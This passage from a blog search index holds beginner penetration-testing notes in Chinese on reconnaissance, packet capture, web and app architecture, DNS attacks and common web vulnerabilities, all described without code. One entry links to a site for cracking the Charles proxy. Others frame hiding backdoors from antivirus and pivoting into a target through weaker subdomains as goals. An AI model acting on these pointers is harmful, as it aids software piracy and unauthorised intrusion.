和域名，泄漏的证件号、手机号、邮箱等信息。）\nhttps://github.com/momosecurity/FindSomething\n\n","slug":"信息收集-1","date":"2025-05-16T12:51:46.055Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"33a92f9ed251723a6f6350c703d02fa8","title":"抓包","content":"基础知识-抓包技术常用工具：burpsuite，charles （两工具可配合使用）\nCharles 破解网站\nhttps://www.zzzmode.com/mytools/charles\n自行百度，没啥可讲\n","slug":"抓包","date":"2025-05-16T12:49:58.517Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"594eeda5be42f7149d59aeeccc66f0a2","title":"app base","content":"基础知识-APP架构APP 应用开发架构：\n1，原生（java）开发\n安卓一般使用 java 语言开发，当然也有使用 kotlin 语言进行开发。\n2，使用 H5 语言开发\nH5 页面可以在任何支持 HTML5 标准的浏览器上运行，无需针对不同的操作系统进行开发。\n易于传播：H5 页面可以通过链接分享，方便用户在社交媒体等平台上进行传播。\n开发成本低：相较于 App 和小程序，H5 页面的开发成本较低，因为可以使用一套代码实现跨平台访问\n3，使用 flutter 开发\nflutter 是谷歌推出的一款 UI 框架，使用 dart 语言进行开发，支持跨平台 weight 渲染直接操作硬件层，体验可媲美原生\n4，常规 Web 开发\nWeb App 软件开发简单来说，就是开发一个网站，然后加入 app 的壳，内容都是 app 内的网页展示，受制于网页技术本身，可实现的功能少，而且每次点开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多容易卡死，体验差\n1，APP - 开发架构 - 原生态 - IDEA\n安全影响：反编译 &amp; 抓包 &amp; 常规测试（逆向的角度去分析逻辑设计安全）\n2，APP - 开发框架 - H5&amp;Vue-HBuilderX\n安全影响：API&amp;JS 框架安全问题 &amp; js 前端测试\n3，WX - 小程序 - 开发架构 - Web 封装 - 平台\n安全影响：常规 web 安全测试\n4，WX - 小程序 - 开发框架 - H5&amp;Vue-HBuilderX\n安全影响：API&amp;JS 框架安全问题 &amp; JS 前端测试\n","slug":"app-base","date":"2025-05-16T12:47:59.079Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"fce321c34fbbe2a41087759c5e15dc0b","title":"web搭建","content":"基础知识-WEB网页搭建常规化：\n\n原理：源码数据都在服务器中\n影响：使用常规的安全测试手法\n\n站库分离：\n\n原理：数据源码不在同一服务器上\n存储：其他服务器上 &amp; 云数据产品\n影响：数据被单独存放，能连接才可能影响数据\n\n前后端分类：\n\n原理：前端 js 框架，API 传输数据\n影响：1，前端页面大部分不存在漏洞 2，后端管理大部分不在同一域名 3，获得的权限有可能 1 不影响后端\n\n集成软件：\n\n原理：打包类集成化环境，权限配置或受控制\n影响：攻击者权限对比区别\n\nDocker 容器：\n\n原理：虚拟化技术独立磁盘空间，非真实物理环境\n\n影响：攻击者虚拟空间磁盘\n\n搭站平台：\n\n模式：1，托管 2，申请\n\n原理：利用别人域名模板建立\n\n影响：实质安全测试非资产目标\n\n\n纯静态：\n\n例子：大学学的 html 设计网页\n原理：数据没有传输性（js 传输不算）\n影响：无漏洞\n\n伪静态：动态为静态技术，伪装的静态\nWAF\n非嵌入型：\n\n硬件型：以硬件形式部署在链路中，支持多种部署方式，当串联到链路中可以拦截恶意流量，在旁路监听时只做记录不拦截（Imperva，天清 WAG 等）\n软件型：以软件形式安装在服务器上，可以直接检测服务器是否存在 webshell，是否有文件被创建等（安全狗，云锁，D 盾等）\n云 WAF：一般以反向代理的形式工作，通过配置 NS 或 CNAME 记录，使得对网站的请求报文优先经过 WAF 主机（阿里云云盾，腾讯云 WAF 等）\n\n嵌入式：\n网站内置的 WAF：直接嵌入在代码中，安全人员在可能受到攻击的地方增强一些安全防护代码，比如过滤敏感字符\nCDN\n\n原理：内容分发服务，提到访问速度\nOSS\n\nOSS\n\n原理：云存储服务，提高资源文件加载速度\n影响：资源单独存储，修复上传漏洞 文件解析不复存在 同时也会有 Accesskey 泄露安全问题影响：隐藏真实 ip\n\n反向代理\n\n原理：通过网络反向代理转发真实服务达到访问目的\n影响：访问目标只是一个代理，非真实应用服务器\n\n负载均衡\n\n原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务器记载服务，测试过程中存在多个目标情况\n\n","slug":"WEB网页搭建","date":"2025-05-16T12:33:20.573Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"ff91b050b55d35fbf6b529d19370e282","title":"Http","content":"Http 和 Https数据包可以看此文章：https://www.runoob.com/w3cnote/http-vs-https.html\n","slug":"http-base","date":"2025-05-16T12:23:28.278Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"},{"id":"46426c79fe8370cebf57bb63c792f570","title":"hello","content":"没有什么东西","slug":"hello","date":"2025-05-16T11:48:45.000Z","categories_index":"乱七八槽","tags_index":"乱七八糟","author_index":"Hao"},{"id":"9bb30c0c918f89cc2cd8ad7521e47e07","title":"概念名词","content":"概念名词1，域名域名（Domain Name）是互联网中用于标识网站的名称，它是一串易于记忆的字符，代替了复杂的 IP 地址，使用户能够更方便地访问互联网上的资源。域名通过将用户输入的文字转换为相应的 IP 地址，帮助用户定位和访问目标网站。‌例如：www.example.com\n\n顶级域名（TLD）‌：这是域名的最后一部分，例如 “.com”、“.net” 或 “.org”。顶级域名通常代表不同的组织类型或地域。\n二级域名（SLD）‌：紧接在顶级域名前的部分，例如 “example” 在 “example.com” 中就是二级域名。\n‌子域名‌：位于二级域名前面，用于进一步划分域名。例如 “blog.example.com” 中的 “blog” 就是子域名。\n\n域名发现对于安全测试的意义：某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。\n例如：www.xxxxx.com 主域不存在漏洞，并且防御措施严密。而二级域名 edu.xxxxx.com 存在漏洞，并且防护措施松散。\n里面就可能存在漏洞，加以利用可以突破到主站的权限。简单来说，多级域名收集的意义，就是一个网站找不到漏洞时，可以找跟它服务器相同的另一个多级域名上的漏洞，做旁路攻击。这就是旁站入侵。\n2，DNSDNS（Domain Name System）是互联网的一项核心服务，其主要功能是将方便记忆的域名（如 example.com）转换为计算机能够识别的 IP 地址（如 192.0.2.1）。这种映射关系使得用户无需记住复杂的数字地址，只需输入域名即可访问目标资源。\n本地 HOSTS 与 DNS 的关系本地 HOSTS 重定向解析 IP 地址，如果网络在解析 IP 地址的时候，ping 这个网站的时候，先到 hosts 文件去看看，有没有对域名对应的 IP 地址，没有的话再去 DNS 服务器上去解析。如果去绑定 IP 地址，可以用这个方法，或者修改 hosts 文件，就能让对方指到此 IP 地址上去，类似于钓鱼攻击。hosts 文件所在的位置：C：\\Windows\\System32\\drivers\\etc\\hosts\nlinux 文件所在位置：&#x2F;etc&#x2F;hosts\nCDN 是什么？与 DNS 的关系？CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。\nCDN 作用： 访问的时候找一个网络最好，通讯最快的节点，访问网络时是访问一个节点，用来解决访问速度。\nCDN 缺点： 由于有节点，访问网络时，请求的是一个节点，真实数据和网络相关核心不在节点上，节点相当于缓存。\n两者之间关系： 更改 DNS 服务器，就相当于有可能访问到另一个节点。\n常见的 DNS 攻击域名劫持通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的 NS 纪录指向到黑客可以控制的 DNS 服务器，然后通过在该 DNS 服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。\n缓存投毒利用控制 DNS 缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。\nDDOS 攻击一种攻击针对 DNS 服务器软件本身，通常利用 BIND 软件程序中的漏洞，导致 DNS 服务器崩溃或拒绝服务；另一种攻击的目标不是 DNS 服务器，而是利用 DNS 服务器作为中间的 “攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。\nDNS 欺骗DNS 欺骗就是攻击者冒充域名服务器的一种欺骗行为。\n3，HTTP 和 HTTPS 区别\n‌安全性‌：HTTP 是明文传输，HTTPS 通过加密保护数据。\n‌证书‌：HTTPS 需要 CA 颁发的证书，而 HTTP 不需要。\nHTTPS 由于加密和解密过程，可能比 HTTP 稍慢，但现代技术已大大缩小了这一差距。\n\n4，后门后门：可以理解为攻击者，在得到相关的非法入侵后，留下后门文件，便于下次进行操作，拿到权限。后门文件：网站后门 (webshell)，服务器后门等其他类型的后门。\n关于后门需要了解哪些？（玩法，免杀）玩法（要能够隐藏自己），免杀（网站有杀毒软件，大部分有杀后门功能，会检测并删除，免杀就是不被检测到）\n5，WEB网站源码：分脚本类型、分应用方向操作系统：windows、linux中间件（搭建平台）：apache、iis、tomcat、nginx 等数据库：access、mysql、mssql、oracle、sybase、db2、postsql 等\nWEB 相关安全漏洞\n1、SQL 注入\nSQL 注入攻击的核心在于让 Web 服务器执行攻击者期望的 SQL 语句，以便得到数据库中的感兴趣的数据或对数据库进行读取、修改、删除、插入等操作，达到其邪恶的目的。\n2、XSS 攻击\nXSS 攻击的核心是将可执行的前端脚本代码（一般为 JavaScript）植入到网页中，听起来比较拗口，用大白话说就是攻击者想让你的浏览器执行他写的 JS 代码\n3、CSRF 攻击\nCSRF，跨站请求伪造，其核心思想在于，在打开 A 网站的情况下，另开 Tab 页面打开恶意网站 B，此时在 B 页面的 “唆使” 下，浏览器发起一个对网站 A 的 HTTP 请求\n4、DDoS 攻击\nDDoS 全称 Distributed Denial of Service：分布式拒绝服务攻击。是拒绝服务攻击的升级版。拒绝攻击服务顾名思义，让服务不可用。\n5、DNS 劫持\n6、JSON 劫持\nJSON 是一种轻量级的数据交换格式，而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适。恶意攻击者通过某些特定的手段，将本应该返回给用户的 JSON 数据进行拦截，转而将数据发送回给恶意攻击者\n7、暴力破解\n8、信息泄露\n由于 Web 服务器或应用程序没有正确处理一些特殊请求，泄露 Web 服务器的一些敏感信息，如用户名、密码、源代码、服务器信息、配置信息等。\n9、目录遍历漏洞\n攻击者向 Web 服务器发送请求，通过在 URL 中或在有特殊意义的目录中附加 ..&#x2F;、或者附加 ..&#x2F; 的一些变形（如 ..\\ 或 ..&#x2F;&#x2F; 甚至其编码），导致攻击者能够访问未授权的目录，以及在 Web 服务器的根目录以外执行命令。\n10，命令执行漏洞\n命令执行漏洞是通过 URL 发起请求，在 Web 服务器端执行未授权的命令，获取系统信息、篡改系统配置、控制整个系统、使系统瘫痪等。\n11、文件上传漏洞\n如果对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。\n12、其他漏洞\nSSLStrip 攻击OpenSSL Heartbleed 安全漏洞CCS 注入漏洞证书有效性验证漏洞13、业务漏洞\n一般业务漏洞是跟具体的应用程序相关，比如参数篡改（连续编号 ID &#x2F; 订单、1 元支付）、重放攻击（伪装支付）、权限控制（越权操作）等。\n14、框架或应用漏洞\n15，XEE 漏洞\nXXE 漏洞全称 XML External Entity Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。\n","slug":"Concept-name","date":"2025-05-16T10:42:06.923Z","categories_index":"基础知识","tags_index":"基础","author_index":"Hao"}]